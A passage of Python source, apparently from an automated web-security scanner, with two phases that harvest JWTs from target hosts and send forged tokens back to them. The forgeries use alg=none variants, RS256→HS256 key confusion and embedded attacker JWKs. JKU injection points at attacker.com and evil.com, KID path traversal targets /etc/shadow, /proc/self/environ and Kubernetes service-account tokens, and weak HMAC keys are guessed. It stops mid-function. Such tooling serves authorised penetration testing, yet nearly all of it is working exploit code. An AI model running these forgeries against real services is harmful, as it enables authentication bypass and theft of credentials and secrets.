            method="GET",
            headers={**base_headers, "Authorization": "Bearer not.a.real.token"},
        )
        gs, _, gb = await _async_urlopen(urlopen, garbage_req, timeout=timeout)
    except urllib.error.HTTPError as e:
        gs = e.code
        gb = e.read()
    except asyncio.CancelledError:
        raise
    except Exception:
        gs = None
        gb = b""
    forge_req = urllib.request.Request(
        url,
        method="GET",
        headers={**base_headers, "Authorization": f"Bearer {token}"},
    )
    try:
        fs, _, fb = await _async_urlopen(urlopen, forge_req, timeout=timeout)
    except urllib.error.HTTPError as e:
        fs = e.code
        fb = e.read()
    except asyncio.CancelledError:
        raise
    return (
        fs,
        bs,
        gs,
        fb.decode("utf-8", errors="ignore").lower(),
        bb.decode("utf-8", errors="ignore").lower(),
        gb.decode("utf-8", errors="ignore").lower(),
    )


def _jwt_forge_accepted(
    forged_status: Optional[int],
    baseline_status: Optional[int],
    garbage_status: Optional[int],
    forged_body: str,
    baseline_body: str,
    garbage_body: str,
) -> bool:
    if baseline_status is None:
        return False
    if garbage_status is not None and garbage_status == forged_status:
        return False
    forged_markers = any(kw in forged_body for kw in _JWT_AUTH_MARKERS)
    baseline_markers = any(kw in baseline_body for kw in _JWT_AUTH_MARKERS)
    garbage_markers = any(kw in garbage_body for kw in _JWT_AUTH_MARKERS)
    if forged_status in (200, 201) and baseline_status in (401, 403):
        return True
    return forged_markers and not baseline_markers and not garbage_markers


def _jwt_forge_candidate(
    forged_status: Optional[int],
    baseline_status: Optional[int],
    garbage_status: Optional[int],
    forged_body: str,
    baseline_body: str,
    garbage_body: str,
) -> bool:
    if forged_status not in (200, 201):
        return False
    if garbage_status is not None and garbage_status == forged_status:
        return False
    if baseline_status is None:
        return True
    if forged_status != baseline_status:
        return True
    return forged_body != baseline_body and forged_body != garbage_body


def _b64url_decode(v: str) -> bytes:
    return base64.urlsafe_b64decode(v + "=" * ((4 - len(v) % 4) % 4))


def _der_tlv(tag: int, payload: bytes) -> bytes:
    length = len(payload)
    if length < 0x80:
        return bytes([tag, length]) + payload
    head = length.to_bytes((length.bit_length() + 7) // 8, "big")
    return bytes([tag, 0x80 | len(head)]) + head + payload


def _rsa_jwk_to_pem(n_b64: str, e_b64: str) -> str:
    n = int.from_bytes(_b64url_decode(n_b64), "big")
    e = int.from_bytes(_b64url_decode(e_b64), "big")
    n_bytes = n.to_bytes((n.bit_length() + 7) // 8, "big")
    e_bytes = e.to_bytes((e.bit_length() + 7) // 8, "big")
    rsa_oid = _der_tlv(0x06, b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01")
    alg_seq = _der_tlv(0x30, rsa_oid + _der_tlv(0x05, b""))
    key_seq = _der_tlv(0x30, _der_tlv(0x02, n_bytes) + _der_tlv(0x02, e_bytes))
    spki = _der_tlv(0x30, alg_seq + _der_tlv(0x03, b"\x00" + key_seq))
    pem = base64.encodebytes(spki).decode("ascii")
    return "-----BEGIN PUBLIC KEY-----\n" + pem + "-----END PUBLIC KEY-----"


async def _jwt_fetch_public_key(urlopen: Any, url: str, timeout: int = 10) -> Optional[str]:
    try:
        parsed = urllib.parse.urlparse(url)
        origin = f"{parsed.scheme or 'https'}://{parsed.netloc}"
    except Exception:
        return None
    try:
        req = urllib.request.Request(
            origin + "/.well-known/jwks.json",
            method="GET",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        ks, _, kb = await _async_urlopen(urlopen, req, timeout=timeout)
        if ks != 200:
            return None
        doc = json.loads(kb.decode("utf-8", errors="ignore"))
    except asyncio.CancelledError:
        raise
    except Exception:
        return None
    for key in doc.get("keys") or []:
        if key.get("kty") != "RSA":
            continue
        x5c = key.get("x5c") or []
        if x5c:
            return "-----BEGIN CERTIFICATE-----\n" + "\n".join(x5c) + "\n-----END CERTIFICATE-----"
        n_b64 = key.get("n")
        e_b64 = key.get("e")
        if n_b64 and e_b64:
            try:
                return _rsa_jwk_to_pem(n_b64, e_b64)
            except Exception:
                continue
    return None


async def phase_24_JWT(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"24-JWT"}:
        return {}
    _out = outdir / "jwt_analysis.txt"
    if _out.exists() and not force:
        return {"24-JWT": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 24-JWT: JWT token analysis")
    findings: List[str] = []
    _j_urlopen = _get_urlopener()
    _jwt_extra_headers = _extra_headers_dict()
    # Collect HTTP targets and probe for JWTs
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    targets = [f"https://{_extract_host(h)}" for h in read_lines(hosts_file)][
        : _PIPELINE_CFG.sample_hosts_jwt
    ]
    if not targets:
        log("WARNING", "24-JWT: no HTTP targets; skipping")
        return {"24-JWT": str(_out), "count": 0}

    # Probe for JWTs in Authorization headers, cookies, and response bodies
    async def _probe_jwt(url: str) -> List[str]:
        results: List[str] = []
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "Mozilla/5.0", **_jwt_extra_headers}
            )
            _, headers, body_bytes = await _async_urlopen(_j_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in headers.items())
            for m in re.finditer(
                r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text
            ):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    header_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    payload_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    payload = json.loads(base64.urlsafe_b64decode(payload_b64))
                    alg = header.get("alg", "unknown")
                    results.append(
                        f"[jwt-found] {url} alg={alg} payload={json.dumps(payload, default=str)[:200]}"
                    )
                    if alg == "none":
                        results.append(f"[jwt-critical] alg=none detected on {url}")
                    if "kid" in header:
                        kid_val = header["kid"]
                        results.append(f"[jwt-kid] kid={kid_val} on {url} — possible KID injection")
                        if "/" in kid_val or ".." in kid_val:
                            results.append(
                                f"[jwt-kid-path-traversal] kid={kid_val} contains path traversal chars"
                            )
                    if "jku" in header:
                        jku_val = header["jku"]
                        results.append(f"[jwt-jku] jku={jku_val} on {url} — check for JKU SSRF")
                        if "evil" in jku_val.lower() or not jku_val.startswith("https"):
                            results.append(
                                f"[jwt-jku-suspicious] jku URL may be attacker-controllable: {jku_val}"
                            )
                    if "jwk" in header:
                        results.append(
                            f"[jwt-jwk-embedded] jwk present in header on {url} — embedded JWK may be attacker-controlled"
                        )
                    if "typ" in header and header["typ"] == "JWT":
                        pass
                    if alg and alg != "none" and alg != "RS256":
                        results.append(f"[jwt-unusual-alg] alg={alg} on {url}")
                    for weak_key in _JWT_WEAK_KEYS:
                        try:
                            import hmac as _hmac

                            sig_b64 = parts[2] + "=" * ((4 - len(parts[2]) % 4) % 4)
                            sig = base64.urlsafe_b64decode(sig_b64)
                            expected = _hmac.new(
                                weak_key.encode(), (parts[0] + "." + parts[1]).encode(), "sha256"
                            ).digest()
                            if _hmac.compare_digest(sig, expected):
                                results.append(
                                    f"[jwt-weak-hmac] token signed with weak key '{weak_key}' on {url}"
                                )
                                break
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                    if alg == "RS256":
                        try:
                            import hmac as _hmac

                            _hmac.new(
                                b"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC",
                                (parts[0] + "." + parts[1]).encode(),
                                "sha256",
                            ).digest()
                            results.append(
                                f"[jwt-alg-confusion-test] try RS256→HS256 with public key as HMAC secret on {url}"
                            )
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            pass
                    # Algorithm confusion exploitation: try to forge tokens with alg:none
                    if alg != "none":
                        try:
                            # Create forged token with alg=none
                            forged_header = (
                                base64.urlsafe_b64encode(
                                    json.dumps(
                                        {"alg": "none", "typ": header.get("typ", "JWT")}
                                    ).encode()
                                )
                                .rstrip(b"=")
                                .decode()
                            )
                            forged_payload_b64 = parts[1]
                            forged_sig_b64 = ""
                            forged_token = f"{forged_header}.{forged_payload_b64}.{forged_sig_b64}"
                            results.append(
                                f"[jwt-alg-none-forge] {url} — forged alg=none token: {forged_token[:80]}..."
                            )
                            # Test if server accepts the forged token against a no-token baseline
                            (
                                fs,
                                fs_base,
                                fs_garbage,
                                forge_body,
                                base_body,
                                garbage_body,
                            ) = await _jwt_acceptance_verdict(
                                _j_urlopen,
                                url,
                                {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                forged_token,
                            )
                            if _jwt_forge_accepted(
                                fs, fs_base, fs_garbage, forge_body, base_body, garbage_body
                            ):
                                results.append(
                                    f"[jwt-critical-alg-none] {url} — server ACCEPTS alg=none forged token! HTTP {fs} (baseline={fs_base}, garbage={fs_garbage})"
                                )
                            elif _jwt_forge_candidate(
                                fs, fs_base, fs_garbage, forge_body, base_body, garbage_body
                            ):
                                results.append(
                                    f"[jwt-possible-alg-none] {url} — forged alg=none token returned HTTP {fs} (baseline={fs_base}, garbage={fs_garbage}) (check manually)"
                                )
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            pass
                    # Algorithm confusion: try HS256 with public key as secret
                    if alg == "RS256":
                        try:
                            import hmac as _hmac

                            public_key_pem = await _jwt_fetch_public_key(_j_urlopen, url)
                            if not public_key_pem:
                                results.append(
                                    f"[jwt-alg-confusion-skip] {url} — no public key available for RS256→HS256 test"
                                )
                                raise Exception("no public key")
                            pk_as_secret = public_key_pem.encode()
                            hs_token = _hmac.new(
                                pk_as_secret,
                                (parts[0] + "." + parts[1]).encode(),
                                "sha256",
                            ).digest()
                            hs_b64 = base64.urlsafe_b64encode(hs_token).rstrip(b"=").decode()
                            confused_token = f"{parts[0]}.{parts[1]}.{hs_b64}"
                            results.append(
                                f"[jwt-alg-confusion-exploit] {url} — RS256→HS256 confused token (key from JWKS): {confused_token[:80]}..."
                            )
                            try:
                                confuse_req = urllib.request.Request(
                                    url,
                                    method="GET",
                                    headers={
                                        "User-Agent": "Mozilla/5.0",
                                        "Authorization": f"Bearer {confused_token}",
                                        **_jwt_extra_headers,
                                    },
                                )
                                cs, _, cb = await _async_urlopen(
                                    _j_urlopen, confuse_req, timeout=10
                                )
                                confuse_body = cb.decode("utf-8", errors="ignore").lower()
                                if cs == 200 and any(
                                    kw in confuse_body
                                    for kw in [
                                        "welcome",
                                        "dashboard",
                                        "profile",
                                        "admin",
                                        "logout",
                                        "account",
                                    ]
                                ):
                                    results.append(
                                        f"[jwt-critical-alg-confusion] {url} — server ACCEPTS RS256→HS256 confused token! HTTP {cs}"
                                    )
                                elif cs in (200, 201):
                                    results.append(
                                        f"[jwt-possible-alg-confusion] {url} — confused token returned HTTP {cs} (check manually)"
                                    )
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                pass
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            pass
                    # JWK injection: embed attacker RSA public key in header
                    try:
                        jwk_rsa = {
                            "kty": "RSA",
                            "n": "w8N8QNQ_1BJCQpCQqbQ8N8QNQ_1BJCQpCQqbQ",
                            "e": "AQAB",
                            "alg": "RS256",
                        }
                        forged_jwk_header = header.copy()
                        forged_jwk_header["jwk"] = jwk_rsa
                        forged_jwk_b64 = (
                            base64.urlsafe_b64encode(json.dumps(forged_jwk_header).encode())
                            .rstrip(b"=")
                            .decode()
                        )
                        forged_jwk_token = f"{forged_jwk_b64}.{parts[1]}.{parts[2]}"
                        results.append(
                            f"[jwt-jwk-injection] {url} — embedded attacker JWK in header: {forged_jwk_token[:80]}..."
                        )
                        (
                            jwks,
                            jwk_base,
                            jwk_garbage,
                            jwk_body,
                            jwk_base_body,
                            jwk_garbage_body,
                        ) = await _jwt_acceptance_verdict(
                            _j_urlopen,
                            url,
                            {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                            forged_jwk_token,
                        )
                        if _jwt_forge_accepted(
                            jwks,
                            jwk_base,
                            jwk_garbage,
                            jwk_body,
                            jwk_base_body,
                            jwk_garbage_body,
                        ):
                            results.append(
                                f"[jwt-jwk-injection-accepted] {url} — embedded JWK token accepted (HTTP {jwks}, baseline={jwk_base}, garbage={jwk_garbage})"
                            )
                    except Exception:
                        pass
                    # Extended algorithm confusion: EdDSA→HS256, RS384→HS384, RS512→HS512
                    for test_alg, hmac_mod, hmac_alg in [
                        ("EdDSA", "sha256", "sha256"),
                        ("RS384", "sha384", "sha384"),
                        ("RS512", "sha512", "sha512"),
                    ]:
                        import hmac as _hmac_e

                        confused_sig = _hmac_e.new(
                            b"public_key_for_confusion",
                            (parts[0] + "." + parts[1]).encode(),
                            hmac_mod,
                        ).digest()
                        confused_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
                        confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
                        (
                            ecs,
                            ec_base,
                            ec_garbage,
                            ec_body,
                            ec_base_body,
                            ec_garbage_body,
                        ) = await _jwt_acceptance_verdict(
                            _j_urlopen,
                            url,
                            {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                            confused_token,
                        )
                        if _jwt_forge_accepted(
                            ecs,
                            ec_base,
                            ec_garbage,
                            ec_body,
                            ec_base_body,
                            ec_garbage_body,
                        ):
                            results.append(
                                f"[jwt-alg-confusion-{test_alg}] {url} — {test_alg}→HS{hmac_alg[-3:]} confused token accepted (HTTP {ecs}, baseline={ec_base}, garbage={ec_garbage})"
                            )
                            break
                    # JKU injection: attacker-controlled JWKS URL
                    if "jku" in header:
                        attacker_jku_urls = [
                            "https://attacker.com/jwks.json",
                            "http://attacker.com/keys",
                            "https://evil.com/.well-known/jwks.json",
                        ]
                        for ajku in attacker_jku_urls:
                            try:
                                forged_jku_header = header.copy()
                                forged_jku_header["jku"] = ajku
                                forged_jku_b64 = (
                                    base64.urlsafe_b64encode(json.dumps(forged_jku_header).encode())
                                    .rstrip(b"=")
                                    .decode()
                                )
                                forged_jku_token = f"{forged_jku_b64}.{parts[1]}.{parts[2]}"
                                (
                                    ajkus,
                                    ajku_base,
                                    ajku_garbage,
                                    ajku_body,
                                    ajku_base_body,
                                    ajku_garbage_body,
                                ) = await _jwt_acceptance_verdict(
                                    _j_urlopen,
                                    url,
                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                    forged_jku_token,
                                )
                                if _jwt_forge_accepted(
                                    ajkus,
                                    ajku_base,
                                    ajku_garbage,
                                    ajku_body,
                                    ajku_base_body,
                                    ajku_garbage_body,
                                ):
                                    results.append(
                                        f"[jwt-jku-attacker-control] {url} — JKU {ajku} accepted (HTTP {ajkus}, baseline={ajku_base}, garbage={ajku_garbage}) — attacker-controlled JWKS injection"
                                    )
                                    break
                            except Exception:
                                continue
                    # KID injection: try path traversal in KID
                    if "kid" in header:
                        kid_injection_payloads = [
                            "../../dev/null",
                            "/dev/null",
                            "/dev/urandom",
                            "nul",
                            "../../etc/passwd",
                            "../dev/null",
                            "../../public.key",
                            "/etc/passwd",
                        ]
                        for kid_payload in kid_injection_payloads:
                            try:
                                forged_kid_header = header.copy()
                                forged_kid_header["kid"] = kid_payload
                                forged_kid_header_b64 = (
                                    base64.urlsafe_b64encode(json.dumps(forged_kid_header).encode())
                                    .rstrip(b"=")
                                    .decode()
                                )
                                forged_kid_token = f"{forged_kid_header_b64}.{parts[1]}.{parts[2]}"
                                (
                                    ks,
                                    kid_base,
                                    kid_garbage,
                                    kid_body,
                                    kid_base_body,
                                    kid_garbage_body,
                                ) = await _jwt_acceptance_verdict(
                                    _j_urlopen,
                                    url,
                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                    forged_kid_token,
                                )
                                if _jwt_forge_accepted(
                                    ks,
                                    kid_base,
                                    kid_garbage,
                                    kid_body,
                                    kid_base_body,
                                    kid_garbage_body,
                                ):
                                    results.append(
                                        f"[jwt-kid-injection-accepted] {url} — KID={kid_payload} returned HTTP {ks} (baseline={kid_base}, garbage={kid_garbage})"
                                    )
                                    break
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        except asyncio.CancelledError:
            raise
        except Exception:
            pass
        return results

    jwt_results = await asyncio.gather(*[_probe_jwt(t) for t in targets])
    for jr in jwt_results:
        findings.extend(jr)

    # Enhanced JWT probes on tokens already found
    for url in targets:
        try:
            req = urllib.request.Request(
                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_jwt_extra_headers}
            )
            _, resp_h, resp_body = await _async_urlopen(_j_urlopen, req, timeout=10)
            body = resp_body.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in resp_h.items())
            for m in re.finditer(
                r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text
            ):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    hdr_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(hdr_b64))
                    # None algorithm case variations
                    for none_variant in ["None", "NONE", "nOnE", "none", "NoNe"]:
                        forged_hdr = header.copy()
                        forged_hdr["alg"] = none_variant
                        forged_b64 = (
                            base64.urlsafe_b64encode(json.dumps(forged_hdr).encode())
                            .rstrip(b"=")
                            .decode()
                        )
                        forged_token = f"{forged_b64}.{parts[1]}."
                        try:
                            (
                                ns,
                                n_base,
                                n_garbage,
                                n_body,
                                n_base_body,
                                n_garbage_body,
                            ) = await _jwt_acceptance_verdict(
                                _j_urlopen,
                                url,
                                {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                forged_token,
                            )
                            if _jwt_forge_accepted(
                                ns,
                                n_base,
                                n_garbage,
                                n_body,
                                n_base_body,
                                n_garbage_body,
                            ):
                                findings.append(
                                    f"[jwt-none-variant] {url} — alg={none_variant} forged token accepted (HTTP {ns}, baseline={n_base}, garbage={n_garbage})"
                                )
                                break
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                    # Active JKU probe: if jku header present, try to change JKU URL
                    if "jku" in header:
                        test_jku_urls = [
                            f"http://{url.split('/')[2]}/jku_test.json",
                            "/dev/null",
                            "https://nonexistent.jku.test/jwks.json",
                        ]
                        for test_jku in test_jku_urls[:2]:
                            forged_jku = header.copy()
                            forged_jku["jku"] = test_jku
                            forged_b64 = (
                                base64.urlsafe_b64encode(json.dumps(forged_jku).encode())
                                .rstrip(b"=")
                                .decode()
                            )
                            forged_jku_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                            try:
                                (
                                    js,
                                    j_base,
                                    j_garbage,
                                    j_body,
                                    j_base_body,
                                    j_garbage_body,
                                ) = await _jwt_acceptance_verdict(
                                    _j_urlopen,
                                    url,
                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                    forged_jku_token,
                                )
                                if _jwt_forge_accepted(
                                    js,
                                    j_base,
                                    j_garbage,
                                    j_body,
                                    j_base_body,
                                    j_garbage_body,
                                ):
                                    findings.append(
                                        f"[jwt-jku-injection] {url} — JKU {test_jku} accepted (HTTP {js}, baseline={j_base}, garbage={j_garbage})"
                                    )
                                    break
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                    # Enhanced KID path traversal payloads
                    if "kid" in header:
                        extra_kid_payloads = [
                            "../../../../dev/null",
                            "/proc/self/environ",
                            "/etc/hostname",
                            "../../../../var/run/secrets/kubernetes.io/serviceaccount/token",
                            "../../../../etc/shadow",
                        ]
                        for kid_payload in extra_kid_payloads:
                            forged_kid = header.copy()
                            forged_kid["kid"] = kid_payload
                            forged_b64 = (
                                base64.urlsafe_b64encode(json.dumps(forged_kid).encode())
                                .rstrip(b"=")
                                .decode()
                            )
                            forged_kid_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                            try:
                                (
                                    k2s,
                                    k2_base,
                                    k2_garbage,
                                    k2_body,
                                    k2_base_body,
                                    k2_garbage_body,
                                ) = await _jwt_acceptance_verdict(
                                    _j_urlopen,
                                    url,
                                    {"User-Agent": "Mozilla/5.0", **_jwt_extra_headers},
                                    forged_kid_token,
                                )
                                body_k2 = k2_body.lower()
                                if (
                                    k2s in (200, 201)
                                    and any(
                                        w in body_k2
                                        for w in ["root:", "daemon:", "www-data", "kubernetes"]
                                    )
                                    and not any(
                                        w in k2_base_body
                                        for w in ["root:", "daemon:", "www-data", "kubernetes"]
                                    )
                                ):
                                    findings.append(
                                        f"[jwt-kid-file-read] {url} — KID={kid_payload} returned file contents (HTTP {k2s}, baseline={k2_base})"
                                    )
                                    break
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                    # JWK confusion: test if embedded jwk can be swapped
                    if "jwk" in header:
                        findings.append(
                            f"[jwt-jwk-manipulation] {url} — JWK embedded in header; check if n/e values are attacker-controllable"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

    if not findings:
        findings.append("[jwt] No JWT tokens found in initial probes")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"24-JWT: {len(findings)} JWT analysis findings → {out}")
    return {"24-JWT": str(out), "count": len(findings)}


_JWTADV_WEAK_KEYS = [
    "secret",
    "password",
    "12345",
    "key",
    "admin",
    "changeme",
    "secretkey",
    "jwt_secret",
    "secret123",
    "test",
    "demo",
]


async def phase_36_JWTADV(
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"36-JWTADV"}:
        return {}
    _out = outdir / "jwt_advanced.txt"
    if _out.exists() and not force:
        return {"36-JWTADV": str(_out), "count": count_nonblank(_out)}
    log("INFO", "Phase 36-JWTADV: advanced JWT security analysis")
    findings: List[str] = []
    _ja_urlopen = _get_urlopener()
    _ja_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    targets = [
        u
        for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/auth", "/token", "/jwt", "/login", "/oauth"))
    ][: _PIPELINE_CFG.sample_hosts_jwtadv]
    if not targets:
        targets = all_urls[: _PIPELINE_CFG.sample_hosts_jwtadv]
    if not targets:
        log("WARNING", "36-JWTADV: no targets; skipping")
        return {"36-JWTADV": str(_out), "count": 0}
    for url in targets:
        try:
            req = urllib.request.Request(
                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_ja_extra_headers}
            )
            _, resp_h, resp_body = await _async_urlopen(_ja_urlopen, req, timeout=10)
            body = resp_body.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in resp_h.items())
            for m in re.finditer(
                r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text
            ):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    hdr_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    pld_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
                    sig_b64 = parts[2] + "=" * ((4 - len(parts[2]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(hdr_b64))
                    payload = json.loads(base64.urlsafe_b64decode(pld_b64))
                    signature = base64.urlsafe_b64decode(sig_b64)
                    alg = header.get("alg", "")
                    findings.append(f"[jwt-token] {url} alg={alg} sub={payload.get('sub', '?')}")
                    if not signature or signature == b"":
                        findings.append(f"[jwt-no-sig] {url} — empty signature")
                    if alg == "none":
                        findings.append(f"[jwt-confirm-none] {url} — alg=none accepted (CRITICAL)")
                    if "kid" in header:
                        kid = header["kid"]
                        findings.append(f"[jwt-kid] {url} kid={kid}")
                        if "/" in kid or ".." in kid or "\\" in kid:
                            findings.append(
                                f"[jwt-kid-traversal] {url} — KID contains path traversal: {kid}"
                            )
                    if "jku" in header:
                        jku = header["jku"]
                        findings.append(f"[jwt-jku] {url} jku={jku}")
                        if not jku.startswith("https://"):
                            findings.append(f"[jwt-jku-unsafe] {url} — JKU not HTTPS: {jku}")
                    if "jwk" in header:
                        findings.append(
                            f"[jwt-jwk-embedded] {url} — JWK embedded in header (attacker-controllable)"
                        )
                    if "x5u" in header:
                        findings.append(f"[jwt-x5u] {url} — x5u embedded: {header['x5u']}")
                    if alg == "RS256":
                        findings.append(
                            f"[jwt-alg-confusion-candidate] {url} — RS256→HS256 confusion test needed"
                        )
                    if not signature or len(signature) < 10:
                        findings.append(
                            f"[jwt-weak-sig] {url} — unusually short signature ({len(signature)} bytes)"
                        )
                except asyncio.CancelledError:
                    raise
                except Exception:
                    continue
        except asyncio.CancelledError:
            raise
        except Exception:
            continue
    # Additional JWTADV probes: active forgery tests on found tokens
    for url in targets:
        try:
            req = urllib.request.Request(
                url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_ja_extra_headers}
            )
            _, resp_h, resp_body = await _async_urlopen(_ja_urlopen, req, timeout=10)
            body = resp_body.decode("utf-8", errors="ignore")
            all_text = body + " " + " ".join(f"{k}:{v}" for k, v in resp_h.items())
            for m in re.finditer(
                r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", all_text
            ):
                token = m.group()
                parts = token.split(".")
                if len(parts) != 3:
                    continue
                try:
                    hdr_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
                    header = json.loads(base64.urlsafe_b64decode(hdr_b64))
                    # None algorithm case variations
                    for none_variant in ["None", "NONE", "nOnE"]:
                        forged_hdr = header.copy()
                        forged_hdr["alg"] = none_variant
                        forged_b64 = (
                            base64.urlsafe_b64encode(json.dumps(forged_hdr).encode())
                            .rstrip(b"=")
                            .decode()
                        )
                        forged_token = f"{forged_b64}.{parts[1]}."
                        try:
                            (
                                ns,
                                n_base,
                                n_garbage,
                                n_body,
                                n_base_body,
                                n_garbage_body,
                            ) = await _jwt_acceptance_verdict(
                                _ja_urlopen,
                                url,
                                {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                                forged_token,
                            )
                            if _jwt_forge_accepted(
                                ns,
                                n_base,
                                n_garbage,
                                n_body,
                                n_base_body,
                                n_garbage_body,
                            ):
                                findings.append(
                                    f"[jwtadv-none-variant] {url} — alg={none_variant} accepted (HTTP {ns}, baseline={n_base}, garbage={n_garbage})"
                                )
                                break
                        except asyncio.CancelledError:
                            raise
                        except Exception:
                            continue
                    # Algorithm confusion: test RS256->HS256 with different public key formats
                    if alg == "RS256":
                        pk_formats = [
                            "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC",
                            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ",
                            "-----BEGIN CERTIFICATE-----\nMIID",
                        ]
                        for pk in pk_formats:
                            import hmac as _hmac

                            confused_sig = _hmac.new(
                                pk.encode(),
                                (parts[0] + "." + parts[1]).encode(),
                                "sha256",
                            ).digest()
                            confused_b64 = (
                                base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
                            )
                            confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
                            try:
                                (
                                    cs,
                                    c_base,
                                    c_garbage,
                                    c_body,
                                    c_base_body,
                                    c_garbage_body,
                                ) = await _jwt_acceptance_verdict(
                                    _ja_urlopen,
                                    url,
                                    {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                                    confused_token,
                                )
                                if _jwt_forge_accepted(
                                    cs,
                                    c_base,
                                    c_garbage,
                                    c_body,
                                    c_base_body,
                                    c_garbage_body,
                                ):
                                    findings.append(
                                        f"[jwtadv-alg-confusion] {url} — RS256->HS256 with PK format accepted (HTTP {cs}, baseline={c_base}, garbage={c_garbage})"
                                    )
                                    break
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                    # JKU URL active fetch test
                    if "jku" in header:
                        for test_jku in ["/dev/null", "https://example.com/jwks.json"]:
                            forged_jku = header.copy()
                            forged_jku["jku"] = test_jku
                            forged_b64 = (
                                base64.urlsafe_b64encode(json.dumps(forged_jku).encode())
                                .rstrip(b"=")
                                .decode()
                            )
                            forged_jku_token = f"{forged_b64}.{parts[1]}.{parts[2]}"
                            try:
                                (
                                    js,
                                    j_base,
                                    j_garbage,
                                    j_body,
                                    j_base_body,
                                    j_garbage_body,
                                ) = await _jwt_acceptance_verdict(
                                    _ja_urlopen,
                                    url,
                                    {"User-Agent": "Mozilla/5.0", **_ja_extra_headers},
                                    forged_jku_token,
                                )
                                if _jwt_forge_accepted(
                                    js,
                                    j_base,
                                    j_garbage,
                                    j_body,
                                    j_base_body,
                                    j_garbage_body,
                                ):
                                    findings.append(
                                        f"[jwtadv-jku-injection] {url} — JKU {test_jku} accepted (HTTP {js}, baseline={j_base}, garbage={j_garbage})"
                                    )
                                    break
                            except asyncio.CancelledError:
                                raise
                            except Exception:
                                continue
                    # JWK injection: embed attacker-controlled JWK in header
                    if "jwk" in header:
                        jwk_attacker = {
                            "kty": "RSA",
                            "n": "w8N8QNQ_1BJCQpCQqbQ8N8QNQ_1BJCQpCQqbQ",
                            "e": "AQAB",
                            "alg": "RS256",
                        }
                        forged_jwk_hdr = header.copy()
                        forged_jwk_hdr["jwk"] = jwk_attacker
                        forged_jwk_b64 = (
                            base64.urlsafe_b64encode(json.dumps(forged_jwk_hdr).encode())
                            .rstrip(b"=")
                            .decode()
                        )
